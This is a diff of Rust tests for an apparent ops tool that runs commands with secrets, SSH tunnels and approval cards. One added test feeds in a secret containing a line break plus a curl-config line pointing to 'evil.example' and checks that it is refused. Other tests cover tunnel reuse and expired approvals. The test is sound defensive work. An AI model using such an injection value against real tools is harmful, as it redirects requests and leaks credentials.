@@ -653,6 +653,12 @@ secrets = { api_key = "DD_API_KEY", app_key = "DD_APP_KEY" }
         "{}",
         out.text
     );
+    // A secret with a line break would add its own lines to curl's config: refused before curl runs.
+    let injecting = |_: &str| -> Result<Secret> {
+        Ok(Secret::new("key\"\nurl = \"https://evil.example/".into()))
+    };
+    let refused = env.runner().run(&plan, &injecting).unwrap_err();
+    assert!(refused.to_string().contains("line break"), "{refused}");
     let read = Recipe::parse(
         r#"
 name = "pg-version"
@@ -779,6 +785,11 @@ via = "acme-prod"
         "{args}"
     );
     assert!(args.contains(":127.0.0.1:5432\n"), "{args}");
+    assert_eq!(
+        args.matches("-N\n").count(),
+        1,
+        "one tunnel for the whole test: {args}"
+    );
 }
 
 fn agent() -> Agent {
@@ -957,6 +968,12 @@ host = "acme-staging"
         )
         .unwrap_err();
     assert!(expired.to_string().contains("Nobody approved"), "{expired}");
+    let late = shown.lock().unwrap().last().unwrap().1;
+    assert!(
+        approvals.answer(late, true).is_none(),
+        "an expired card takes no answer"
+    );
+    assert!(approvals.get(late).is_none());
     assert!(approvals.list().is_empty());
 
     let proposed = ops
